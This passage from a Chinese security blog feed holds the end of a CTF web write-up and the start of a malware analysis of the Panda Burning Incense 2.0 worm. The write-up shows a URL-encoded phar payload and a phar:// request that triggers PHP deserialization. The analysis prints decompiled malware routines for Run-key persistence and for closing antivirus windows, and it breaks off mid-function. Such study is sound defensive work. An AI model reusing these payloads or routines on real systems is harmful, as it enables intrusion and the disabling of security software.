写入新文件</span><br></pre></td></tr></table></figure><p>运行项目并下载源码</p><p>以url编码形式输出文件内容 </p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line"> </span><br><span class="line">with open(<span class="string">&quot;fixed_phar.phar.gz&quot;</span><span class="punctuation">,</span> &#x27;rb&#x27;) as fi<span class="punctuation">:</span></span><br><span class="line">    f = fi.read()</span><br><span class="line">    ff = urllib.parse.quote(f) #获取信息</span><br><span class="line">    print(ff)</span><br></pre></td></tr></table></figure><p>运行项目并下载源码</p><p>写入phar文件</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>=%<span class="number">1</span>F%<span class="number">8</span>B%<span class="number">08</span>%<span class="number">08</span>%<span class="number">7</span>C%<span class="number">22</span>%<span class="number">1</span>Df%<span class="number">00</span>%<span class="number">03</span>fixed_phar.phar%<span class="number">00</span>s%F7t%B3%B0L%B4%B1/%C8%<span class="number">28</span>P%<span class="number">88</span>%<span class="number">8</span>F%F7p%F4%<span class="number">09</span>%<span class="number">89</span>w%F6%F7%<span class="number">0</span>D%F0%F4q%<span class="number">0</span>D%D2%D0%B4V%B0%B7%E3%E5z%C8%C0%C0%C0%<span class="number">08</span>%C4%<span class="number">82</span>P%<span class="number">9</span>A%<span class="number">81</span>a5%<span class="number">10</span>%FB%<span class="number">5</span>B%<span class="number">99</span>X%<span class="number">29</span>%<span class="number">95</span>%<span class="number">14</span>%A5%A6%<span class="number">2</span>AY%<span class="number">19</span>YU%<span class="number">17</span>%<span class="number">83</span>xy%<span class="number">89</span>%B9%A9J%D6%FEV%A6VJ%<span class="number">89</span>%<span class="number">05</span>%<span class="number">0590</span>%<span class="number">19</span>c%<span class="number">2</span>B%A5%<span class="number">8</span>A%<span class="number">8</span>A%<span class="number">0</span>A%<span class="number">90</span>%<span class="number">04</span>%<span class="number">90</span>%<span class="number">95</span>%<span class="number">98</span>Y%A4de%<span class="number">08</span>%<span class="number">126</span>%B4R%<span class="number">2</span>A%<span class="number">00</span>%<span class="number">09</span>%E20%C6%CF%<span class="number">1</span>A%AC31%B9D%<span class="number">09</span>%C82%<span class="number">042</span>%<span class="number">83</span>%<span class="number">0</span>Br%DC2sR%FD%<span class="number">93</span>%B2RA%<span class="number">82</span>%B5%B5%<span class="number">60</span>%D5i9%<span class="number">89</span>%E9%<span class="number">20</span>%<span class="number">15</span>%<span class="number">16</span>VJ%FAi%<span class="number">20</span>N%<span class="number">3</span>A%<span class="number">90</span>%<span class="number">5</span>B%<span class="number">8</span>B%D0%EBg%CD%<span class="number">01</span>tmIjq%<span class="number">89</span>%<span class="number">5</span>EIE%<span class="number">09</span>%<span class="number">0</span>B%C8%F9%<span class="number">8</span>A%B2i%<span class="number">20</span>%<span class="number">9</span>A%A7%AE%FE%C66%<span class="number">88</span>%<span class="number">87</span>%C0%F2%CBO%CC%FE%BAh%E5%FC%<span class="number">1</span>B%B2%AD%C9%<span class="number">1</span>A%B7<span class="number">.8</span>%<span class="number">19</span>O%EC9%<span class="number">26</span>%C9%<span class="number">04</span>%<span class="number">94</span>sw%F2u%<span class="number">02</span>%<span class="number">00</span>%<span class="number">15</span>%<span class="number">9</span>D%B7%<span class="number">24</span>%<span class="number">27</span>%<span class="number">01</span>%<span class="number">00</span>%<span class="number">00</span>&amp;<span class="number">1</span>=O<span class="punctuation">:</span><span class="number">1</span><span class="punctuation">:</span><span class="attr">&quot;D&quot;</span><span class="punctuation">:</span><span class="number">2</span><span class="punctuation">:</span><span class="punctuation">&#123;</span>s<span class="punctuation">:</span><span class="number">5</span><span class="punctuation">:</span><span class="string">&quot;start&quot;</span>;s<span class="punctuation">:</span><span class="number">1</span><span class="punctuation">:</span><span class="string">&quot;w&quot;</span>;<span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>运行项目并下载源码</p><p>phar协议读文件操作触发phar反序列化拿flag</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>=phar<span class="punctuation">:</span><span class="comment">///tmp/96c72754133e4a4d55d0baee6bfdb66a.jpg&amp;1=O:1:&quot;D&quot;:2:&#123;s:5:&quot;start&quot;;s:1:&quot;r&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>运行项目并下载源码</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Dest0g3 520-web&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://flypigc.github.io/categories/WriteUp/"/>
    
    
    <category term="web安全" scheme="https://flypigc.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>传统病毒分析</title>
    <link href="https://flypigc.github.io/2025/12/11/%E4%BC%A0%E7%BB%9F%E7%97%85%E6%AF%92%E5%8F%8D%E5%88%86%E6%9E%90%E6%80%9D%E8%B7%AF/"/>
    <id>https://flypigc.github.io/2025/12/11/%E4%BC%A0%E7%BB%9F%E7%97%85%E6%AF%92%E5%8F%8D%E5%88%86%E6%9E%90%E6%80%9D%E8%B7%AF/</id>
    <published>2025-12-11T07:47:30.162Z</published>
    <updated>2025-12-20T01:55:33.337Z</updated>
    
    <content type="html"><![CDATA[<p>传统病毒分析-熊猫烧香2.0</p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文对传统病毒（熊猫烧香2.0）进行了系统性逆向分析。该病毒活跃于2006–2007年，曾在中国造成大规模感染，其核心特征包括：通过U盘和局域网自动传播、感染可执行文件并替换桌面图标为“熊猫烧香”、强力对抗杀毒软件、以及多重持久化机制。本报告详细剖析了其注册表自启动、窗口检测关闭安全工具、网络共享枚举、移动存储自动运行等关键技术模块，并结合现代安全视角评估其当前威胁等级，同时提供完整的应急处置与清除方案，为理解传统蠕虫病毒的攻击范式及防御演进提供重要参考。</p><h1 id="熊猫烧香2-0"><a href="#熊猫烧香2-0" class="headerlink" title="熊猫烧香2.0"></a>熊猫烧香2.0</h1><h2 id="1-基本信息"><a href="#1-基本信息" class="headerlink" title="1. 基本信息"></a>1. 基本信息</h2><p>文件名: setup.exe</p><p>文件哈希值:</p><p>MD5: ad41ec81ab55c17397d3d6039752b0fd</p><p>SHA256: aee99bc628b7c16a418560d4712f7dabfe8c273b4b78d8dbf804ccd7b6ea15e1</p><p>CRC32: 0x902e661b</p><p>文件大小: 59KB</p><h2 id="2-病毒特征"><a href="#2-病毒特征" class="headerlink" title="2. 病毒特征"></a>2. 病毒特征</h2><p>通过逆向分析，确认该样本是熊猫烧香2.0病毒，具有以下特征：</p><h3 id="2-1-进程与服务"><a href="#2-1-进程与服务" class="headerlink" title="2.1 进程与服务"></a>2.1 进程与服务</h3><p>创建恶意进程 <code>spoclsv.exe</code> 并将其写入 <code>drivers</code> 目录</p><p>使用 Windows 系统服务名称伪装自身</p><h3 id="2-2-自启动机制"><a href="#2-2-自启动机制" class="headerlink" title="2.2 自启动机制"></a>2.2 自启动机制</h3><p>修改注册表 <code>SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code></p><p>创建 <code>Desktop_.ini</code> 文件实现持久化</p><p>在所有用户的启动目录添加恶意程序</p><p>创建 <code>autorun.inf</code> 文件实现U盘等移动存储设备自动运行</p><p>sub_4052CC–Windows 注册表写入操作，主要用于向指定注册表路径写入一个字符串值（REG_SZ），实现持久化</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">LSTATUS __userpurge sub_4052CC@&lt;eax&gt;(LPCSTR lpValueName@&lt;ecx&gt;<span class="punctuation">,</span> LPCSTR lpSubKey@&lt;edx&gt;<span class="punctuation">,</span> HKEY hKey@&lt;eax&gt;<span class="punctuation">,</span> BYTE *lpData)</span><br><span class="line"><span class="comment">//lpValueName要创建的注册表的值名（如 &quot;MyBackdoor&quot;）</span></span><br><span class="line"><span class="comment">//LPCSTR lpSubKey@&lt;edx&gt;子健路径（如 &quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;）</span></span><br><span class="line"><span class="comment">//HKEY hKey@&lt;eax&gt; [in] 根键（如 HKEY_CURRENT_USER 或 HKEY_LOCAL_MACHINE）</span></span><br><span class="line"><span class="comment">//BYTE *lpData    [in] 要写入的数据（通常是字符串，如 &quot;C:\\malware.exe&quot;）</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  int v5; <span class="comment">// eax</span></span><br><span class="line">  DWORD dwDisposition; <span class="comment">// [esp+8h] [ebp-8h] BYREF</span></span><br><span class="line">  HKEY phkResult; <span class="comment">// [esp+Ch] [ebp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  phkResult = <span class="number">0</span>;</span><br><span class="line">  dwDisposition = <span class="number">1</span>;</span><br><span class="line">  RegCreateKeyExA(hKey<span class="punctuation">,</span> lpSubKey<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0xF003F</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> &amp;phkResult<span class="punctuation">,</span> &amp;dwDisposition);<span class="comment">//创建打开注册表子键</span></span><br><span class="line">  v5 = sub_4052B4(); <span class="comment">//获取数据长度</span></span><br><span class="line">  RegSetValueExA(phkResult<span class="punctuation">,</span> lpValueName<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">1</span>u<span class="punctuation">,</span> lpData<span class="punctuation">,</span> v5 + <span class="number">1</span>);<span class="comment">//写入注册表值</span></span><br><span class="line">  return RegCloseKey_0(phkResult); <span class="comment">//关闭句柄并返回</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">上面的详细流程</span><br><span class="line">通过 RegCreateKeyExA 创建注册表项</span><br><span class="line">操作路径： Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">设置 svcshare 键值指向病毒程序</span><br><span class="line">使用 RegSetValueExA 写入键值数据</span><br><span class="line">最后通过 RegCloseKey_0 关闭注册表句柄</span><br></pre></td></tr></table></figure><p>启动文件夹自启动</p><p>相关地址 ：0x40a584、0x40a610、0x40a640</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1764488766014-7d202424-1ea3-475e-8cf8-8ff1fc64b51e.png" alt="img"></p><p>字符串引用 ： Start Menu\Programs\Startup</p><p>机制 ：将病毒文件复制到系统启动文件夹，实现开机自动运行</p><h3 id="2-3-反杀毒能力"><a href="#2-3-反杀毒能力" class="headerlink" title="2.3 反杀毒能力"></a>2.3 反杀毒能力</h3><ul><li><p>检测并终止多种杀毒软件进程，包括：</p></li><li><p>瑞星系列: Ravmond.exe, CCenter.exe, RavTask.exe 等</p></li><li><p>金山系列: KVXP.kxp, KvMonXP.kxp 等</p></li><li><p>诺顿系列: Symantec AntiVirus 相关进程</p></li><li><p>McAfee、NOD32等其他安全软件</p></li><li><p>禁用任务管理器和注册表编辑器</p></li><li><p>修改系统设置隐藏文件</p></li></ul><p>sub_4062C8–杀毒软件检测与终止</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line">int __stdcall sub_4062C8()</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  HWND hWndChildAfter; <span class="comment">// ebx</span></span><br><span class="line">  HWND hWndParent; <span class="comment">// edi</span></span><br><span class="line">  HWND hWndParent_1; <span class="comment">// edi</span></span><br><span class="line">  HWND hWndParent_2; <span class="comment">// eax</span></span><br><span class="line">  HWND hWnd; <span class="comment">// eax</span></span><br><span class="line">  BYTE bScan; <span class="comment">// al</span></span><br><span class="line">  BYTE bScan_1; <span class="comment">// al</span></span><br><span class="line">  BYTE bScan_2; <span class="comment">// al</span></span><br><span class="line">  BYTE bScan_3; <span class="comment">// al</span></span><br><span class="line">  BYTE bScan_4; <span class="comment">// al</span></span><br><span class="line">  BYTE bScan_5; <span class="comment">// al</span></span><br><span class="line">  BYTE bScan_6; <span class="comment">// al</span></span><br><span class="line">  BYTE bScan_7; <span class="comment">// al</span></span><br><span class="line">  unsigned int v14<span class="punctuation">[</span><span class="number">6</span><span class="punctuation">]</span>; <span class="comment">// [esp-Ch] [ebp-108h] BYREF</span></span><br><span class="line">  CHAR String<span class="punctuation">[</span><span class="number">101</span><span class="punctuation">]</span>; <span class="comment">// [esp+97h] [ebp-65h] BYREF</span></span><br><span class="line">  int savedregs; <span class="comment">// [esp+FCh] [ebp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v14<span class="punctuation">[</span><span class="number">2</span><span class="punctuation">]</span> = (unsigned int)&amp;savedregs;</span><br><span class="line">  v14<span class="punctuation">[</span><span class="number">1</span><span class="punctuation">]</span> = (unsigned int)&amp;loc_406BF1;</span><br><span class="line">  v14<span class="punctuation">[</span><span class="number">0</span><span class="punctuation">]</span> = (unsigned int)NtCurrentTeb()-&gt;NtTib.ExceptionList;</span><br><span class="line">  __writefsdword(<span class="number">0</span><span class="punctuation">,</span> (unsigned int)v14);</span><br><span class="line">  sub_406218();</span><br><span class="line">  hWndChildAfter = <span class="number">0</span>;</span><br><span class="line">  hWndParent = GetDesktopWindow();</span><br><span class="line">  do</span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    hWndChildAfter = FindWindowExA(hWndParent<span class="punctuation">,</span> hWndChildAfter<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    GetWindowTextA(hWndChildAfter<span class="punctuation">,</span> String<span class="punctuation">,</span> <span class="number">101</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">    sub_403EB4(<span class="number">101</span><span class="punctuation">,</span> String);</span><br><span class="line">    if ( sub_4041B4() )</span><br><span class="line">      PostMessageA(hWndChildAfter<span class="punctuation">,</span> <span class="number">0x12</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line">  while ( hWndChildAfter );</span><br><span class="line">  hWndParent_1 = GetDesktopWindow();</span><br><span class="line">  do</span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    hWndChildAfter = 